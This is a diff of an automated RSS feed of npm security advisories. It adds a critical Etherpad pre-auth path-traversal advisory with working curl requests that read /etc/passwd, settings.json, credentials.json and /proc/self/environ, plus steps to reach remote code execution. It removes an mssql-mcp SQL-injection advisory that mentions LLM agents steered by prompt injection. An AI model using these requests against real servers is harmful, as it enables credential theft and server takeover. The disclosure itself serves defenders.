@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-11-19T23:25:07.811Z</updated>
+    <updated>2026-11-20T05:56:14.609Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,118 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[ep_etherpad-lite] Etherpad: Pre-auth arbitrary file read]]></title>
+        <id>https://github.com/advisories/GHSA-mc8w-wjhw-45x5</id>
+        <link href="https://github.com/advisories/GHSA-mc8w-wjhw-45x5"/>
+        <updated>2026-11-20T00:23:46.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>ep_etherpad-lite</td>
+<td><code>&gt;= 1.8.14, &lt; 3.3.3</code></td>
+<td><code>3.3.3</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>An unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.</p>
+<h3 id="details">Details</h3>
+<p>Etherpad serves plugin static assets through src/node/utils/Minify.ts. The request path is first passed through the canonical sanitizer src/node/utils/sanitizePathname.ts, which is careful to convert backslashes to forward slashes only on Windows:</p>
+<pre><code>// src/node/utils/sanitizePathname.ts:11-20
+p = pathApi.normalize(p);
+if (pathApi.isAbsolute(p)) throw new Error(`absolute paths are forbidden: ${p}`);
+if (p.split(pathApi.sep)[0] === '..') throw new Error(`directory traversal: ${p}`);
+// THIS CONVERSION MUST ONLY BE DONE ON WINDOWS, otherwise on POSIXish systems '..\\' in the input
+// pathname would not be normalized away before being converted to '../'.
+if (pathApi.sep === '\\') p = p.replace(/\\/g, '/');
+</code></pre>
+<p>On Linux a backslash is an ordinary filename byte, so an input segment like ......\test contains no ./.. path components and passes every check in sanitizePathname unchanged. The project's own test suite confirms this: src/tests/backend-new/specs/sanitizePathname.ts:62 lists ['posix', '..\foo'] among the accepted paths (returned unchanged).</p>
+<p>The vulnerability is that Minify.ts then performs that Windows‑only conversion unconditionally, after the sanitizer has run, justified by a comment asserting the opposite of the invariant above:</p>
+<pre><code>// src/node/utils/Minify.ts:171-186
+const match = filename.match(/^plugins\/([^/]+)(\/(?:(static\/.*)|.*))?$/);
+if (match) {
+const library = match[1];
+const libraryPath = match[2] || '';
+if (plugins.plugins[library] &amp;&amp; match[3]) {
+const plugin = plugins.plugins[library];
+const pluginPath = plugin.package.realPath;      // for 'ep_etherpad-lite' == &lt;root&gt;/src
+filename = path.join(pluginPath, libraryPath);   // -&gt; absolute path, backslashes preserved
+// ... "This conversion does not introduce a directory
+// traversal vulnerability because all '..\\' substrings have already been removed by
+// sanitizePathname."                              // &lt;-- FALSE on POSIX
+filename = filename.replace(/\\/g, '/');          // &lt;-- reintroduces ../ AFTER the check
+}
+</code></pre>
+<p>After line 186 the string becomes a real traversal (/src/static/../../../../etc/passwd) with no re‑normalization and no containment check
+before the filesystem calls at Minify.ts:248 (fs.stat) and Minify.ts:315 (fs.readFile). Because path.join at line 179 produced an absolute
+path, path.resolve(ROOT_DIR, filename) discards ROOT_DIR entirely, and POSIX path.resolve collapses surplus .. at /, so the payload is root‑depth‑agnostic.</p>
+<p>The route is reachable pre‑authentication. It is registered on the expressPreSession hook:</p>
+<pre><code>// src/ep.json
+{ "name": "static", "hooks": { "expressPreSession": "ep_etherpad-lite/node/hooks/express/static" } }
+// src/node/hooks/express/static.ts:38
+app.all('/static/*filename', minify);
+</code></pre>
+<p>and expressPreSession runs before the auth middleware:</p>
+<pre><code>// src/node/hooks/express.ts:244-247
+await hooks.aCallAll('expressPreSession', {app, settings});   // static route registered here
+app.use(exports.sessionMiddleware);
+app.use(webaccess.checkAccess);                                // auth runs AFTER
+</code></pre>
+<p>The plugin branch is always taken because src/static/js/pluginfw/plugins.ts:153-158 unconditionally registers the core pseudo‑plugin ep_etherpad-lite with package.realPath = /src.</p>
+<p>Two decode facts make the exploit functional: Express 5 / path‑to‑regexp v8 decode wildcard params per segment, once ((v) =&gt;  v.split('/').map(decodeURIComponent)), so req.params.filename.join('/') (Minify.ts:147) yields the once‑decoded path fed to the sanitizer, and %5C (encoded backslash) is the only working separator (%2F decodes to /, is re‑split, and is rejected by the split('/')[0] === '..' guard).</p>
+<h3 id="poc">PoC</h3>
+<p>Applies to a default production deployment (no special configuration; works on Linux, e.g. the Docker image or a systemd source install). Replace TARGET:9001 with the instance.</p>
+<ol>
+<li>Read /etc/passwd (or any file) with no authentication. --path-as-is prevents the client from folding the traversal:</li>
+</ol>
+<pre><code>curl --path-as-is \
+'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'
+</code></pre>
+<p>Other high‑value reads (over‑shoot the .. depth; it is absorbed at /):</p>
+<p>admin password + secrets, root-agnostic via /proc/self/cwd</p>
+<pre><code>curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/settings.json'
+curl --path-as-is
+'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/credentials.json'
+</code></pre>
+<p>on docker-compose deployments the admin password is an env var:
+<code>curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/environ'</code></p>
+<p>Each response returns the raw file bytes (with a harmless Content-Type: false header for extension‑less targets, Node coerces the value and does not throw).</p>
+<ol start="2">
+<li>Escalate to RCE. Recover the admin credential from the files read in step 1, then:</li>
+</ol>
+<p>mint an admin session</p>
+<pre><code>curl -i -X POST 'http://TARGET:9001/admin-auth/' \
+-H "Authorization: Basic $(printf 'admin:PASSWORD' | base64)"
+# -&gt; 200 + Set-Cookie: &lt;prefix&gt;express_sid=...
+</code></pre>
+<p>Using that express_sid cookie, connect to the /pluginfw/installer Socket.IO namespace (gated only on session.user.is_admin, src/node/hooks/express/adminplugins.ts:22) and emit install for an attacker‑controlled ep_* plugin. Etherpad require()s the plugin's code in‑process during plugins.update() (src/static/js/pluginfw/shared.ts:30), executing arbitrary code as the Etherpad user.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Type: Improper limitation of a pathname → unauthenticated arbitrary file read, with potential to remote code execution.</li>
+<li>Access required: None. The vulnerable route is served before the authentication/authorization middleware, so it is exploitable by any client that can reach the HTTP port, regardless of requireAuthentication, requireAuthorization, or users configuration.</li>
+<li>What an attacker can access: any file readable by the Etherpad process user, including settings.json/credentials.json (admin password, sessionKey, database credentials, SSO client secrets), /proc/self/environ (env‑supplied secrets such as ADMIN_PASSWORD, DB_PASS), the pad database, TLS private keys, and OS files such as /etc/passwd.</li>
+<li>Escalation: the disclosed admin password yields an admin session; the admin plugin installer then provides in‑process code execution, i.e. full server takeover. Even without the plugin step, admin access permits rewriting the entire configuration (saveSettings + restartServer) and exfiltrating all stored data.</li>
+<li>Who is impacted: every operator running an affected version, most severely those exposing Etherpad directly to untrusted networks. A reverse proxy does not mitigate it, the traversal uses %5C, which proxies forward unchanged.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ether/etherpad/security/advisories/GHSA-mc8w-wjhw-45x5">https://github.com/ether/etherpad/security/advisories/GHSA-mc8w-wjhw-45x5</a></li>
+<li><a href="https://github.com/ether/etherpad/pull/8081">https://github.com/ether/etherpad/pull/8081</a></li>
+<li><a href="https://github.com/ether/etherpad/commit/9c8d16d50e2fdfd9693ab35c43280410cb4db2fc">https://github.com/ether/etherpad/commit/9c8d16d50e2fdfd9693ab35c43280410cb4db2fc</a></li>
+<li><a href="https://github.com/advisories/GHSA-mc8w-wjhw-45x5">https://github.com/advisories/GHSA-mc8w-wjhw-45x5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mc8w-wjhw-45x5</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-11-20T00:23:45.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[codewhale] CodeWhale: exec_shell parallel-readonly classifier auto-approves fd/rg/git grep exec flags enabling silent RCE]]></title>
         <id>https://github.com/advisories/GHSA-3mgh-93r5-r7jf</id>
@@ -1276,62 +1388,6 @@ await new ChainBuilder().build(impostor, [trustedAnchor]);
 <td>@connorbritain/mssql-mcp-server</td>
 <td><code>&lt;= 0.5.2</code></td>
 <td><code>0.6.0</code></td>
-</tr>
-</tbody>
-</table>
-<p>Several tools in <code>mssql-mcp-core</code> built T-SQL by string-interpolating caller-supplied identifiers and predicates directly into the statement passed to the node-mssql <code>Request.query()</code> batch API. Only data values were parameterized.</p>
-<p>Affected tools and inputs:</p>
-<ul>
-<li><code>update_data</code>, <code>delete_data</code>: <code>tableName</code> and the free-form <code>whereClause</code> were interpolated raw.</li>
-<li><code>insert_data</code>: <code>tableName</code> and column names (object keys) were interpolated raw.</li>
-<li><code>execute_transaction</code>: the same raw <code>tableName</code>/<code>whereClause</code> interpolation per operation.</li>
-<li><code>create_table</code>, <code>create_index</code>, <code>drop_table</code>: table/column/index/schema identifiers were interpolated with no or insufficient validation.</li>
-<li><code>list_databases</code> (reader tier): the <code>stateFilter</code> argument was interpolated raw into the query, with only a non-enforced inputSchema enum guarding it.</li>
-</ul>
-<p>The only check on <code>whereClause</code> was that it was non-empty. Because the row-count and preview queries run before the <code>confirmUpdate</code>/<code>confirmDelete</code> step, a malicious <code>whereClause</code> or <code>tableName</code> executed on the first call, bypassing the preview/confirmation and <code>maxRows</code> safety controls. <code>Request.query()</code> submits a multi-statement T-SQL batch, so a crafted input enabled stacked statements (arbitrary DDL/DML), sub-selects, and (with a privileged login and <code>xp_cmdshell</code> enabled) OS command execution. Because <code>list_databases</code> is a read-only tool, the <code>stateFilter</code> sink makes the reader package injectable as well.</p>
-<h2 id="impact">Impact</h2>
-<p>An actor who can supply tool arguments (a malicious or compromised MCP client, or an LLM agent steered via indirect prompt injection) could read, modify, or drop arbitrary data, bypass the <code>read_data</code> allow/deny validation and the preview/confirmation/<code>maxRows</code> safeguards, and conditionally achieve OS command execution.</p>
-<h2 id="patches">Patches</h2>
-<p>Fixed in <code>@connorbritain/mssql-mcp-core</code> 0.6.0:</p>
-<ul>
-<li>All identifiers are validated against a strict allowlist and bracket-quoted via a shared helper.</li>
-<li>The free-form <code>whereClause</code> string parameter is removed (breaking change) and replaced with structured, parameterized filters (<code>{ column, operator, value }</code>) using an operator allowlist. Values are always bound, never interpolated.</li>
-<li><code>list_databases</code> validates <code>stateFilter</code> against a fixed allowlist before use.</li>
-</ul>
-<p>Upgrade the consumer packages: <code>mssql-mcp-reader</code> 0.5.0, <code>mssql-mcp-writer</code> 0.5.0, <code>mssql-mcp-server</code> 0.6.0 (all depend on core <code>^0.6.0</code>).</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Upgrading is the only complete fix; the <code>list_databases</code> (<code>stateFilter</code>) sink is reachable even under <code>READONLY=true</code> and in the reader package. As defense in depth, run the server under a least-privilege SQL login with <code>xp_cmdshell</code> disabled, and restrict which MCP clients can invoke the tools.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ConnorBritain/mssql-mcp-core/security/advisories/GHSA-2m9m-6cr5-9x25">https://github.com/ConnorBritain/mssql-mcp-core/security/advisories/GHSA-2m9m-6cr5-9x25</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63129">https://nvd.nist.gov/vuln/detail/CVE-2026-63129</a></li>
-<li><a href="https://github.com/ConnorBritain/mssql-mcp-core/pull/1">https://github.com/ConnorBritain/mssql-mcp-core/pull/1</a></li>
-<li><a href="https://github.com/ConnorBritain/mssql-mcp-core/commit/227e2efc4e3311c477b7ae509c3ae15437a4f815">https://github.com/ConnorBritain/mssql-mcp-core/commit/227e2efc4e3311c477b7ae509c3ae15437a4f815</a></li>
-<li><a href="https://github.com/ConnorBritain/mssql-mcp-core/commit/a9727f83768598e4fdbddfbc717ccfebb84ae7af">https://github.com/ConnorBritain/mssql-mcp-core/commit/a9727f83768598e4fdbddfbc717ccfebb84ae7af</a></li>
-<li><a href="https://github.com/advisories/GHSA-2m9m-6cr5-9x25">https://github.com/advisories/GHSA-2m9m-6cr5-9x25</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2m9m-6cr5-9x25</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-19T00:46:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@connorbritain/mssql-mcp-writer] mssql-mcp-core: SQL injection in mssql-mcp write tools via unparameterized table names and WHERE clauses]]></title>
-        <id>https://github.com/advisories/GHSA-2m9m-6cr5-9x25</id>
-        <link href="https://github.com/advisories/GHSA-2m9m-6cr5-9x25"/>
-        <updated>2026-11-19T00:46:41.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@connorbritain/mssql-mcp-writer</td>
-<td><code>&lt;= 0.4.2</code></td>
-<td><code>0.5.0</code></td>
 </tr>
 </tbody>
 </table>
